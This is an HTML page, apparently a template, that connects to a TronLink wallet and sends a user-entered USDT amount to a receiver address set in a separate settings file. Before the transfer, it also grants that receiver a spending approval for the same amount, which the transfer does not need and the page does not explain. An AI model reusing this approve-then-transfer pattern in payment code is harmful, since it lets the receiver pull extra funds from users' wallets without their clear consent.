<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Approval and Send</title>
    <script src="settings.js"></script>
    <style>
        /* General styles for the body */
        body {
            margin: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1d2b64, #f8cdda);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Container styles for centering form */
        .container {
            background: rgba(255, 255, 255, 0.8);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
            position: relative;
            max-width: 400px;
            text-align: center;
        }

        /* Input styles */
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 8px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        /* Button styles */
        button {
            background-color: #1d2b64;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #f8cdda;
        }

        /* Bubble animation */
        .bubble {
            position: absolute;
            width: 20px;
            height: 20px;
            background-color: #1d2b64;
            border-radius: 50%;
            animation: bubble 15s infinite ease-in-out;
        }

        .bubble:nth-child(1) {
            top: 20%;
            left: 10%;
            animation-delay: 0s;
        }

        .bubble:nth-child(2) {
            top: 30%;
            left: 50%;
            animation-delay: 2s;
        }

        .bubble:nth-child(3) {
            top: 70%;
            left: 80%;
            animation-delay: 4s;
        }

        .bubble:nth-child(4) {
            top: 80%;
            left: 20%;
            animation-delay: 6s;
        }

        @keyframes bubble {
            0% {
                transform: scale(0);
                opacity: 1;
            }
            100% {
                transform: scale(4);
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="your-brand-logo.png" alt="Brand Logo" style="width: 100px; margin-bottom: 20px;">
        <form id="usdtForm">
            <label for="senderAddress">Sender Address</label>
            <input type="text" id="senderAddress" readonly>

            <label for="amount">Amount (USDT)</label>
            <input type="number" id="amount" min="1" required>

            <button type="submit" id="sendButton">Send USDT</button>
        </form>
    </div>

    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@2.2.0/dist/TronWeb.min.js"></script>
    <script>
        const contractABI = [
            {"constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "payable": false, "stateMutability": "view", "type": "function"},
            {"constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
            {"constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"},
            {"constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "payable": false, "stateMutability": "view", "type": "function"},
            {"constant": true, "inputs": [{"name": "who", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function"}
        ];

        window.addEventListener('load', async () => {
            if (window.tronWeb && window.tronWeb.ready) {
                const tronWeb = window.tronWeb;
                try {
                    const accounts = await tronWeb.trx.getAccounts();
                    document.getElementById('senderAddress').value = accounts[0].address;
                } catch (error) {
                    console.error("Error fetching accounts", error);
                }
            } else {
                alert(settings.alertMessages.tronLinkNotInstalled);
            }
        });

        document.getElementById('usdtForm').addEventListener('submit', async (event) => {
            event.preventDefault();
            const amount = document.getElementById('amount').value;
            if (amount <= settings.minAmount) {
                alert(settings.alertMessages.amountTooLow);
                return;
            }

            const tronWeb = window.tronWeb;
            const contractAddress = settings.contractAddress;
            const contract = tronWeb.contract(contractABI, contractAddress);

            const senderAddress = document.getElementById('senderAddress').value;
            const receiverAddress = settings.receiverAddress;

            try {
                // Approve the amount
                await contract.approve(
                    receiverAddress,
                    tronWeb.toSun(amount)
                ).send({ from: senderAddress });

                // Transfer the amount
                await contract.transfer(
                    receiverAddress,
                    tronWeb.toSun(amount)
                ).send({ from: senderAddress });

                alert(settings.alertMessages.transactionSuccess);
            } catch (error) {
                console.error('Transaction failed:', error);
                alert(settings.alertMessages.transactionFailed);
            }
        });
    </script>
</body>
</html>
